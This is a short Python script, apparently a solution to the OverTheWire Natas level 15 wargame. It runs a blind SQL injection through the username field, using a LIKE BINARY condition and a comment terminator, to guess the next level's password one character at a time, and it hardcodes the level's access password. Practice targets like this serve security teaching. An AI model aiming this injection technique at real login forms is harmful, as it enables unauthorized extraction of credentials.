import requests
from requests.auth import HTTPBasicAuth
from string import ascii_letters
ch = ascii_letters+'0123456789'
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug' #?debug會進入調適模式，可加可不加
ps15 = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
user = 'natas16'
passwd=''
for i in range(64):
    for chr in ch:
        atmp = {'username' : 'natas16" and password LIKE BINARY "' + passwd + chr + '%" #'}
        r = requests.post(url,auth=HTTPBasicAuth('natas15',ps15),data = atmp) #data :將可能會使用到的參數都上傳
        #print(r.text)
        if "doesn't" not in r.text:
            passwd+=chr
            print(passwd)
            break
    if len(passwd) != i+1:
        break

